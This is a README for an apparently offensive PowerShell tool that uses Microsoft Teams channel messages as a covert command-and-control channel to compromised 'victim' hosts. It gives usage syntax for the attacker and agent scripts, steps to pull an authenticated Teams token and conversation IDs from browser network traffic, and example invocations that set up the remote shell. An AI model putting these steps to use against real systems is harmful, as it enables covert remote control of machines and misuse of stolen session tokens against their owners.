# TeamsCh-Shell

## Overview
This project aims to create a lightweight tool that utilizes the Microsoft Teams Channel API to establish command and control over compromised systems with as few prerequisites as possible. The command and control communication solely abuses the Microsoft Teams Channel API, and no Teams desktop app installation is required.

## Workflow
![image](https://github.com/user-attachments/assets/3773069b-f6eb-4ad1-b089-97b684ade053)



 
## Usage
### Agent
```
. ./TeamsCh-Shell-Agent.ps1
TeamsCh-Shell-Agent -Inputconversationid "$Inputconversationid" -Outputconversationid "$Outputconversationid" -token "$token"
```
```
- token                 Authenticated browser token running on Microsoft Teams
- Inputconversationid   Teams Channel conversation ID for receive command
- Outputconversationid  Teams channel conversation ID for the output of the executed command result
- time                  The time interval to check for updated commands in the Teams Channel

Notes: Token expiration time is 24 hours by default
```
### Attacker
```
. ./TeamsCh-Shell-Attacker.ps1
TeamsCh-Shell-Attacker -Inputconversationid "$Inputconversationid" -Outputconversationid "$Outputconversationid" -token "$token"
```
```
- token                 Authenticated browser token running on Microsoft Teams
- Inputconversationid   Teams Channel conversation ID for receive command output
- Outputconversationid  Teams channel conversation ID for the output of the executed command
- time                  The time interval to check for executed command result in the Teams Channel

Notes: Token expiration time is 24 hours by default
```
## Steps to reproduce

1. Create Two Teams Channels:
- One channel is designated for the attacker to transfer system commands that will be received and executed on the victim's host.
> [!NOTE]
> Attacker's Teams token has Read and Write permissions on the channel, while Victim's Teams token has at least Read permission.
- Second channel is used to receive the results of the executed commands from the victim's host, allowing attacker to read the commands results from this channel.
> [!NOTE]  
> Victim's Teams token has Read and Write permissions on the channel, while Attacker's Teams token has at least Read permission.

![image](https://github.com/user-attachments/assets/a4410565-d00c-4bca-aeda-e9cced628dba)
![image](https://github.com/user-attachments/assets/65abccb5-3141-4b8e-acd4-d2d056bb6f37)

2. Extract token and conversationid of Teams Channels:
- Access the Inspect tool and navigate to the Network tab.
- Send a message in the Teams channel and apply a filter for the keyword 'messages' to filter relevant network traffic.
- Extract the Authenticated Teams token and conversationID from the request.
 
![image](https://github.com/user-attachments/assets/b1e06cee-8008-4ca8-bac3-cc8880871c11)

3. Execute TeamsCh-Shell-Attacker.ps1 script on the attacker host and input the command:
```
. ./TeamsCh-Shell-Attacker.ps1
TeamsCh-Shell-Attacker.ps1 -Outputconversationid "19:952***9e@t***2" -Inputconversationid "19:c92***8a@t***2" -token "eyJ0eXAiOiJ***PykNgVhCEjA"
```
![image](https://github.com/user-attachments/assets/80d95a72-d261-48a7-86f1-e856b57a406c)

4. Execute TeamsCh-Shell-Agent.ps1 script on the victim host:
```
. ./TeamsCh-Shell-Agent.ps1
TeamsCh-Shell-Agent.ps1 -Inputconversationid "19:952***9e@t***2" -Outputconversationid "19:c92***8a@t***2" -token "eyJ0eXAiO***Cu9Jp8l3kF70Ug"
```
![image](https://github.com/user-attachments/assets/61a706f9-5e7e-450f-a038-919ff86c374f)

5. Shell callback Notification
- Power Automate can set up a condition to check for incoming messages to the channel. If incoming messages are sent to the channel, the condition is triggered, and a notification email will be sent to the inputted email address.

![image](https://github.com/user-attachments/assets/8d092800-9509-4a96-bc7c-3be190498ef2)

## Reference

- [convoC2](https://github.com/cxnturi0n/convoC2) by @cxnturi0n
- [Microsoft-Teams-GIFShell](https://github.com/bobbyrsec/Microsoft-Teams-GIFShell) by @bobbyrsec
- [gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs](https://medium.com/@bobbyrsec/gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs-1618c4e64ed7) by @bobbyrsec
